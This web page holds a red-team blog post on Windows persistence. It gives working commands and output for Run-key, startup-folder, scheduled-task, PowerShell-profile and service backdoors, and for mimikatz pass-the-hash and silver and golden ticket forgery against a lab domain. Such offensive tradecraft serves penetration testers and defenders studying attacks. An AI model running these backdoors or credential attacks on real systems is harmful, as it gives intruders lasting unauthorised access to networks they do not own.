

  
    
  


  




  


  

<!DOCTYPE html>
<html lang="en-us">
  <head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Hugo 0.41">
    <meta name="theme" content="Tranquilpeak 0.3.1-BETA">
    <title>A View of Persistence</title>
    <meta name="author" content="Rasta Mouse">
    <meta name="keywords" content="">

    <link rel="icon" href="https://rastamouse.me/favicon.ico">
    

    
    <meta name="description" content="
Persistence, noun, the continued or prolonged existence of something.


">
    <meta property="og:description" content="
Persistence, noun, the continued or prolonged existence of something.


">
    <meta property="og:type" content="blog">
    <meta property="og:title" content="A View of Persistence">
    <meta property="og:url" content="/2018/03/a-view-of-persistence/">
    <meta property="og:site_name" content="Rasta Mouse">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Rasta Mouse">
    <meta name="twitter:description" content="
Persistence, noun, the continued or prolonged existence of something.


">
    
      <meta name="twitter:creator" content="@_RastaMouse">
    
    

    
    

    
      <meta property="og:image" content="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=640">
    

    
      <meta property="og:image" content="https://rastamouse.me/images/persist-ovr/thumb.jpg">
    
    
    

    

    
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.css" />
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" />
    
    
    <link rel="stylesheet" href="https://rastamouse.me/css/style-u6mk0ojoywresbx8iepslrmmhl4stuhrsxuwhkpwrkrx7mryjcaimasnk4pi.min.css" />
    
    

    
      
<script>
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-60712346-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

    
    
  </head>

  <body>
    <div id="blog">
      <header id="header" data-behavior="4"> 
  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
  <div class="header-title">
    <a class="header-title-link" href="https://rastamouse.me/">Rasta Mouse</a>
  </div>
  
    
      <a class="header-right-picture "
         href="https://rastamouse.me/#about">
    
    
    
      
        <img class="header-picture" src="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=90" alt="Author&#39;s picture" />
      
    
    </a>
  
</header>
      <nav id="sidebar" data-behavior="4">
  <div class="sidebar-container">
    
      <div class="sidebar-profile">
        <a href="https://rastamouse.me/#about">
          <img class="sidebar-profile-picture" src="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=110" alt="Author&#39;s picture" />
        </a>
        <h4 class="sidebar-profile-name">Rasta Mouse</h4>
        
          <h5 class="sidebar-profile-bio">Taylor Swift fan, wannabe Red Teamer &amp; 1337 hax0r (in that order).</h5>
        
      </div>
    
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/categories">
    
      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
      
      <span class="sidebar-button-desc">Categories</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/tags">
    
      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
      
      <span class="sidebar-button-desc">Tags</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/archives">
    
      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
      
      <span class="sidebar-button-desc">Archives</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/#about">
    
      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
      
      <span class="sidebar-button-desc">About</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/">
    
      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
      
      <span class="sidebar-button-desc">Home</span>
    </a>
  </li>

    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://twitter.com/_RastaMouse" target="_blank">
    
      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
      
      <span class="sidebar-button-desc">Twitter</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://keybase.io/rasta_mouse" target="_blank">
    
      <i class="sidebar-button-icon fa fa-lg fa-lock"></i>
      
      <span class="sidebar-button-desc">Keybase</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastalabs.net" target="_blank">
    
      <i class="sidebar-button-icon fa fa-lg fa-shield"></i>
      
      <span class="sidebar-button-desc">RastaLabs</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://github.com/rasta-mouse" target="_blank">
    
      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
      
      <span class="sidebar-button-desc">GitHub</span>
    </a>
  </li>

    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://rastamouse.me/index.xml">
    
      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
      
      <span class="sidebar-button-desc">RSS</span>
    </a>
  </li>

    </ul>
  </div>
</nav>

      

      <div id="main" data-behavior="4"
        class="
               hasCoverMetaIn
               ">
        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
          
          
            <div class="post-header main-content-wrap text-left">
  
    <h1 class="post-title" itemprop="headline">
      A View of Persistence
    </h1>
  
  <div class="postShorten-meta post-meta">
  
    <time itemprop="datePublished" datetime="2018-03-22T00:00:00Z">
      
  
  
  
  
    22 March 2018
  

    </time>
  
  
  
  
    <span>in</span>
    
      <a class="category-link" href="https://rastamouse.me/categories/blog">blog</a>
    
  


</div>

</div>
          
          <div class="post-content markdown" itemprop="articleBody">
            <div class="main-content-wrap">
              <blockquote>
<p>Persistence, noun, the continued or prolonged existence of something.</p>
</blockquote>

<p></p>

<p>This is not something that usually gets much attention, despite it being a vital aspect of an attack lifecycle.  When reading up on subjects like the &ldquo;Cyber Kill Chain&rdquo;, we frequently see 7 main steps:</p>

<ol>
<li>Recon</li>
<li>Weaponisation</li>
<li>Delivery</li>
<li>Exploitation</li>
<li>Installation</li>
<li>Command &amp; Control</li>
<li>Actions on Objectives</li>
</ol>

<p>In this post, I want to run through some basic persistence strategies and techniques.</p>

<h2 id="c2-vs-privilege">C2 vs Privilege</h2>

<p>The installation step can be described as &ldquo;the installation of a backdoor on the compromised system, allowing an adversary to maintain persistence in the target environment&rdquo;.  The obvious translation is &ldquo;to regain command &amp; control over the system (should it be lost), without having to repeat steps 1 through 4.&rdquo;  For example, if we phish a user and establish C2 on their workstation, we need to ensure we can regain control should they reboot, or we kill our shell because we&rsquo;re noobs, without having to phish them again.</p>

<p>However, &ldquo;maintaining persistence&rdquo; is much more than just regaining C2 over a single (or even multiple) system(s) - it&rsquo;s about maintaining levels of privilege and access across an envronment.</p>

<p>If you have to repeat steps 1-4 to get back to a previous point, you are not being persistent.</p>

<h2 id="c2">C2</h2>

<h3 id="userland-vs-elevated">Userland vs Elevated</h3>

<p>Typically, persistence mechanisms that trigger a C2 channel exist in one of the following levels:</p>

<ol>
<li>Medium Mandatory Level in the context of a standard user.</li>
<li>High Mandatory Level in the context of SYSTEM.</li>
</ol>

<h4 id="userland-techniques">Userland Techniques</h4>

<h5 id="hkcu">HKCU</h5>

<p>Create a <code>REG_SZ</code> value in the <code>Run</code> key within <code>HKCU\Software\Microsoft\Windows</code>. (Other keys are available).</p>

<pre><code class="language-text">Value name:  Backdoor
Value data:  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
</code></pre>

<h5 id="start-up">Start-Up</h5>

<p>Create a batch script in the user startup folder.</p>

<pre><code class="language-text">PS C:\&gt; gc C:\Users\Rasta\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat
start /b C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
</code></pre>

<h5 id="scheduled-tasks">Scheduled Tasks</h5>

<pre><code class="language-text">PS C:\&gt; $A = New-ScheduledTaskAction -Execute &quot;cmd.exe&quot; -Argument &quot;/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe&quot;
PS C:\&gt; $T = New-ScheduledTaskTrigger -AtLogOn -User &quot;Rasta&quot;
PS C:\&gt; $P = New-ScheduledTaskPrincipal &quot;Rasta&quot;
PS C:\&gt; $S = New-ScheduledTaskSettingsSet
PS C:\&gt; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
PS C:\&gt; Register-ScheduledTask Backdoor -InputObject $D
</code></pre>

<p>There are multiple trigger options to explore.</p>

<h5 id="powershell-profiles">PowerShell Profiles</h5>

<p>If your user is a heavy PowerShell user, backdoor their PowerShell profile.</p>

<pre><code class="language-text">PS C:\&gt; Test-Path $profile
False

PS C:\&gt; New-Item -Path $profile -Type File â€“Force

    Directory: C:\Users\Rasta\Documents\WindowsPowerShell

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       22/03/2018     12:42              0 Microsoft.PowerShell_profile.ps1

PS C:\&gt; $string = 'Start-Process &quot;cmd.exe&quot;'
PS C:\&gt; $string | Out-File -FilePath &quot;C:\Users\Rasta\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1&quot; -Append
</code></pre>

<h4 id="elevated-techniques">Elevated Techniques</h4>

<h5 id="hklm">HKLM</h5>

<p>Similar to HKCU.  Create a <code>REG_SZ</code> value in the <code>Run</code> key within <code>HKLM\Software\Microsoft\Windows</code>.</p>

<pre><code class="language-text">Value name:  Backdoor
Value data:  C:\Windows\Temp\backdoor.exe
</code></pre>

<h5 id="services">Services</h5>

<p>Create a service that will start automatically or on-demand.</p>

<pre><code class="language-text">PS C:\&gt; New-Service -Name &quot;Backdoor&quot; -BinaryPathName &quot;C:\Windows\Temp\backdoor.exe&quot; -Description &quot;Nothing to see here.&quot;
</code></pre>

<h5 id="scheduled-tasks-1">Scheduled Tasks</h5>

<p>Scheduled Task to run as SYSTEM, everyday at 9am.</p>

<pre><code class="language-text">PS C:\&gt; $A = New-ScheduledTaskAction -Execute &quot;cmd.exe&quot; -Argument &quot;/c C:\Windows\Temp\backdoor.exe&quot;
PS C:\&gt; $T = New-ScheduledTaskTrigger -Daily -At 9am
PS C:\&gt; $P = New-ScheduledTaskPrincipal &quot;NT AUTHORITY\SYSTEM&quot; -RunLevel Highest
PS C:\&gt; $S = New-ScheduledTaskSettingsSet
PS C:\&gt; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
PS C:\&gt; Register-ScheduledTask Backdoor -InputObject $D
</code></pre>

<h2 id="maintaining-privilege">Maintaining Privilege</h2>

<h5 id="passwords">Passwords</h5>

<p>Steal clear text passwords and use them with <code>runas</code> or other session spawning functionality.</p>

<pre><code class="language-text">C:\Users\rasta&gt;dir \\fs01\c$
Access is denied.
</code></pre>

<pre><code class="language-text">C:\Users\rasta&gt;runas /netonly /user:FS01\Administrator cmd
Enter the password for FS01\Administrator:
Attempting to start cmd as user &quot;FS01\Administrator&quot; ...
</code></pre>

<pre><code class="language-text">C:\Windows\system32&gt;dir \\fs01\c$
 Volume in drive \\fs01\c$ has no label.
 Volume Serial Number is 069A-2329

 Directory of \\fs01\c$

16/07/2016  13:23    &lt;DIR&gt;          PerfLogs
14/10/2017  10:26    &lt;DIR&gt;          Program Files
16/07/2016  13:23    &lt;DIR&gt;          Program Files (x86)
22/03/2018  14:57    &lt;DIR&gt;          Users
22/03/2018  14:57    &lt;DIR&gt;          Windows
               0 File(s)              0 bytes
               5 Dir(s)  41,994,084,352 bytes free
</code></pre>

<h5 id="ntlm-hashes">NTLM hashes</h5>

<p>If you can&rsquo;t get passwords, use NTLM hashes with techniques such as Pass-the-Hash or psexec.  Both domain accounts and local accounts can work.</p>

<pre><code class="language-text">C:\Users\rasta&gt;dir \\fs01\c$
Access is denied.
</code></pre>

<pre><code class="language-text">mimikatz # sekurlsa::pth /user:Administrator /domain:FS01 /rc4:fc525c9683e8fe067095ba2ddc971889 /ptt
user    : Administrator
domain  : FS01
program : cmd.exe
impers. : no
NTLM    : fc525c9683e8fe067095ba2ddc971889
  |  PID  3876
  |  TID  2952
  |  LSA Process is now R/W
  |  LUID 0 ; 691999 (00000000:000a8f1f)
  \_ msv1_0   - data copy @ 00000214BC31C610 : OK !
  \_ kerberos - data copy @ 00000214BC5529B8
   \_ aes256_hmac       -&gt; null
   \_ aes128_hmac       -&gt; null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace -&gt; null
</code></pre>

<pre><code class="language-text">C:\Windows\system32&gt;dir \\fs01\c$
 Volume in drive \\fs01\c$ has no label.
 Volume Serial Number is 069A-2329

 Directory of \\fs01\c$

16/07/2016  13:23    &lt;DIR&gt;          PerfLogs
14/10/2017  10:26    &lt;DIR&gt;          Program Files
16/07/2016  13:23    &lt;DIR&gt;          Program Files (x86)
22/03/2018  14:57    &lt;DIR&gt;          Users
22/03/2018  14:57    &lt;DIR&gt;          Windows
               0 File(s)              0 bytes
               5 Dir(s)  41,993,674,752 bytes free
</code></pre>

<h5 id="local-groups">Local Groups</h5>

<p>Adding new local users can provide a method of getting back into machines.  If placing them in the <code>Administrators</code> group is too obvious, use other privileged groups such as <code>Remote Desktop Users</code>, <code>Remote Management Users</code> or <code>Backup Operators</code>.</p>

<h5 id="domain-groups">Domain Groups</h5>

<p>Often times, domain groups are created to administer groups of machines by granting local admin privilege over them.  Adding your own domain account to these groups can provide you persistent access to multiple machines at once.</p>

<h5 id="silver-tickets">Silver Tickets</h5>

<p>With the NTLM hash of a computer account, silver tickets can be used to regain local admin privileges via the CIFS service.</p>

<pre><code class="language-text">* Username : FS01$
* Domain   : LAB
* NTLM     : 47b1d9d581f29b3b43845692bd4a0322
</code></pre>

<pre><code class="language-text">C:\Users\rasta&gt;dir \\fs01\c$
Access is denied.
</code></pre>

<pre><code class="language-text">mimikatz # kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /target:fs01 /rc4:47b1d9d581f29b3b43845692bd4a0322 /service:cifs /ptt
User      : Administrator
Domain    : testlab.local (TESTLAB)
SID       : S-1-5-21-1516486103-3973840447-1748718438
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 47b1d9d581f29b3b43845692bd4a0322 - rc4_hmac_nt
Service   : cifs
Target    : fs01
Lifetime  : 22/03/2018 15:25:33 ; 19/03/2028 15:25:33 ; 19/03/2028 15:25:33
-&gt; Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ testlab.local' successfully submitted for current session
</code></pre>

<pre><code class="language-text">C:\Users\rasta&gt;dir \\fs01\c$
 Volume in drive \\fs01\c$ has no label.
 Volume Serial Number is 069A-2329

 Directory of \\fs01\c$

16/07/2016  13:23    &lt;DIR&gt;          PerfLogs
14/10/2017  10:26    &lt;DIR&gt;          Program Files
16/07/2016  13:23    &lt;DIR&gt;          Program Files (x86)
22/03/2018  14:57    &lt;DIR&gt;          Users
22/03/2018  14:57    &lt;DIR&gt;          Windows
               0 File(s)              0 bytes
               5 Dir(s)  41,994,330,112 bytes free
</code></pre>

<h5 id="golden-tickets">Golden Tickets</h5>

<p>Golden tickets can be used to forge access to any service in the domain.</p>

<pre><code class="language-text">SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 22/03/2018 14:49:02
Object Security ID   : S-1-5-21-1516486103-3973840447-1748718438-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 9063b8edb3d04ed734edd49e5b0adef3
    ntlm- 0: 9063b8edb3d04ed734edd49e5b0adef3
    lm  - 0: be97fc24cf1ad2cc2d193430d113f45c
</code></pre>

<pre><code class="language-text">C:\Users\rasta&gt;dir \\dc01\c$
Access is denied.
</code></pre>

<pre><code class="language-text">mimikatz # kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /rc4:9063b8edb3d04ed734edd49e5b0adef3 /ptt
User      : Administrator
Domain    : testlab.local (TESTLAB)
SID       : S-1-5-21-1516486103-3973840447-1748718438
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 9063b8edb3d04ed734edd49e5b0adef3 - rc4_hmac_nt
Lifetime  : 22/03/2018 15:36:25 ; 19/03/2028 15:36:25 ; 19/03/2028 15:36:25
-&gt; Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ testlab.local' successfully submitted for current session
</code></pre>

<pre><code class="language-text">C:\Users\rasta&gt;dir \\dc01\c$
 Volume in drive \\dc01\c$ has no label.
 Volume Serial Number is 069A-2329

 Directory of \\dc01\c$

16/07/2016  13:23    &lt;DIR&gt;          PerfLogs
14/10/2017  10:26    &lt;DIR&gt;          Program Files
16/07/2016  13:23    &lt;DIR&gt;          Program Files (x86)
22/03/2018  14:42    &lt;DIR&gt;          Users
22/03/2018  14:48    &lt;DIR&gt;          Windows
               0 File(s)              0 bytes
               5 Dir(s)  41,120,235,520 bytes free
</code></pre>

<h2 id="be-strategic">Be Strategic</h2>

<p>You should always have an idea of what your persistence strategy will be.  Take the time to understand the limitations and advantages of each technique.  Experiment with different payloads such as PowerShell, PE&rsquo;s, DLLs and scriptlets.  Learn about staged and stageless payloads and where they work best.  Consider the use of different transports like HTTP/S, SMB and DNS.</p>
              
            </div>
          </div>
          <div id="post-footer" class="post-footer main-content-wrap">
            
              
                
                
                  <div class="post-footer-tags">
                    <span class="text-color-light text-small">TAGGED IN</span><br/>
                    
  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/persistence/">persistence</a>

                  </div>
                
              
            
            <div class="post-actions-wrap">
  <nav>
    <ul class="post-actions post-action-nav">
      
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/05/review-active-directory-attacks-for-red-and-blue-teams/" data-tooltip="Review: Active Directory Attacks for Red and Blue Teams">
          
            <i class="fa fa-angle-left"></i>
            <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
          </a>
        </li>
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/03/laps---part-2/" data-tooltip="LAPS - Part 2">
          
            <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
            <i class="fa fa-angle-right"></i>
          </a>
        </li>
      
    </ul>
  </nav>
  <ul class="post-actions post-action-share">
    
      <li class="post-action hide-lg hide-md hide-sm">
        <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
          <i class="fa fa-share-alt"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
          <i class="fa fa-google-plus"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
          <i class="fa fa-facebook-official"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
          <i class="fa fa-twitter"></i>
        </a>
      </li>
    
    
      <li class="post-action">
        <a class="post-action-btn btn btn--default" href="#disqus_thread">
          <i class="fa fa-comment-o"></i>
        </a>
      </li>
    
    <li class="post-action">
      
        <a class="post-action-btn btn btn--default" href="#">
      
        <i class="fa fa-list"></i>
      </a>
    </li>
  </ul>
</div>


            
              
                <div id="disqus_thread">
  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
              
            
          </div>
        </article>
        <footer id="footer" class="main-content-wrap">
  <span class="copyrights">
    &copy; 2018 Rasta Mouse. All Rights Reserved
  </span>
</footer>

      </div>
      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
        <div class="post-actions-wrap">
  <nav>
    <ul class="post-actions post-action-nav">
      
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/05/review-active-directory-attacks-for-red-and-blue-teams/" data-tooltip="Review: Active Directory Attacks for Red and Blue Teams">
          
            <i class="fa fa-angle-left"></i>
            <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
          </a>
        </li>
        <li class="post-action">
          
            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2018/03/laps---part-2/" data-tooltip="LAPS - Part 2">
          
            <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
            <i class="fa fa-angle-right"></i>
          </a>
        </li>
      
    </ul>
  </nav>
  <ul class="post-actions post-action-share">
    
      <li class="post-action hide-lg hide-md hide-sm">
        <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
          <i class="fa fa-share-alt"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
          <i class="fa fa-google-plus"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
          <i class="fa fa-facebook-official"></i>
        </a>
      </li>
      <li class="post-action hide-xs">
        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
          <i class="fa fa-twitter"></i>
        </a>
      </li>
    
    
      <li class="post-action">
        <a class="post-action-btn btn btn--default" href="#disqus_thread">
          <i class="fa fa-comment-o"></i>
        </a>
      </li>
    
    <li class="post-action">
      
        <a class="post-action-btn btn btn--default" href="#">
      
        <i class="fa fa-list"></i>
      </a>
    </li>
  </ul>
</div>


      </div>
      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
  <ul class="share-options">
    <li class="share-option">
      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
        <i class="fa fa-google-plus"></i><span>Share on Google Plus</span>
      </a>
    </li>
    <li class="share-option">
      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
        <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
      </a>
    </li>
    <li class="share-option">
      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2018%2f03%2fa-view-of-persistence%2f">
        <i class="fa fa-twitter"></i><span>Share on Twitter</span>
      </a>
    </li>
  </ul>
</div>
<div id="share-options-mask" class="share-options-mask"></div>
    </div>
    
    <div id="about">
  <div id="about-card">
    <div id="about-btn-close">
      <i class="fa fa-remove"></i>
    </div>
    
      <img id="about-card-picture" src="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=110" alt="Author&#39;s picture" />
    
    <h4 id="about-card-name">Rasta Mouse</h4>
    
      <div id="about-card-bio">Taylor Swift fan, wannabe Red Teamer &amp; 1337 hax0r (in that order).</div>
    
    
      <div id="about-card-job">
        <i class="fa fa-briefcase"></i>
        <br/>
        Penetration Tester
      </div>
    
    
      <div id="about-card-location">
        <i class="fa fa-map-marker"></i>
        <br/>
        UK
      </div>
    
  </div>
</div>

    <div id="algolia-search-modal" class="modal-container">
  <div class="modal">
    <div class="modal-header">
      <span class="close-button"><i class="fa fa-close"></i></span>
      <a href="https://algolia.com" target="_blank" class="searchby-algolia text-color-light link-unstyled">
        <span class="searchby-algolia-text text-color-light text-small">by</span>
        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
      </a>
      <i class="search-icon fa fa-search"></i>
      <form id="algolia-search-form">
        <input type="text" id="algolia-search-input" name="search"
          class="form-control input--large search-input" placeholder="Search" />
      </form>
    </div>
    <div class="modal-body">
      <div class="no-result text-color-light text-center">no post found</div>
      <div class="results">
        
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/">
                <h3 class="media-heading">A Lesson in .NET Framework Versions</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Sep 9, 2018
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>With the emergence of more C# and .NET tooling, I occasionally see people tripping up over this.  It&rsquo;s not a huge issue, just something to be aware of.</p>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2018/09/enumerating-applocker-config/">
                <h3 class="media-heading">Enumerating AppLocker Config</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Sep 9, 2018
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>Very quick post to explore some different ways to enumerate the AppLocker configuration being applied to a host, both remotely and locally.  Understanding these rules, particularly deny rules, are useful for engineering bypasses.</p>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2018/06/rdpclip/">
                <h3 class="media-heading">RDPClip</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Jun 6, 2018
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>This is just a quick post to demonstrate some interesting aspects of the Remote Desktop Clipboard Monitor.</p>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2018/05/csharp-dotnettojscript-xsl/">
                <h3 class="media-heading">CSharp, DotNetToJScript, XSL</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  May 5, 2018
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>In April 2018, <a href="https://twitter.com/subTee">Casey Smith</a> published a finding he dubbed <a href="http://subt0x11.blogspot.co.uk/2018/04/wmicexe-whitelisting-bypass-hacking.html">squiblytwo</a>, which detailed how WMIC can be used to invoke arbitary code contained in the extensible stylesheet language (XSL) format.</p>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2018/05/review-active-directory-attacks-for-red-and-blue-teams/">
                <h3 class="media-heading">Review: Active Directory Attacks for Red and Blue Teams</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  May 5, 2018
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>Along with <a href="https://twitter.com/Cneelis">Cn33liz</a>, I recently had the pleasure of assisting <a href="https://twitter.com/nikhil_mitt">Nikhil Mittal</a> with his 2018 BruCON spring training: Active Directory Attacks for Red and Blue Teams.</p>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2018/03/a-view-of-persistence/">
                <h3 class="media-heading">A View of Persistence</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2018
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><blockquote>
<p>Persistence, noun, the continued or prolonged existence of something.</p>
</blockquote>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2018/03/laps---part-2/">
                <h3 class="media-heading">LAPS - Part 2</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2018
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p>In <a href="https://rastamouse.me/2018/03/laps---part-1/">Part 1</a> we explored how one could go about discovering and mapping the LAPS configuration in a domain.  In this part, we&rsquo;ll look at various ways LAPS can be abused for persistence purposes.</p>

<p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
              <a class="link-unstyled" href="https://rastamouse.me/2018/03/laps---part-1/">
                <h3 class="media-heading">LAPS - Part 1</h3>
              </a>
              <span class="media-meta">
                <span class="media-date text-small">
                  Mar 3, 2018
                </span>
              </span>
              <div class="media-content hide-xs font-merryweather"><p></p></div>
            </div>
            <div style="clear:both;"></div>
            <hr>
          </div>
        
          <div class="media">
            
            <div class="media-body">
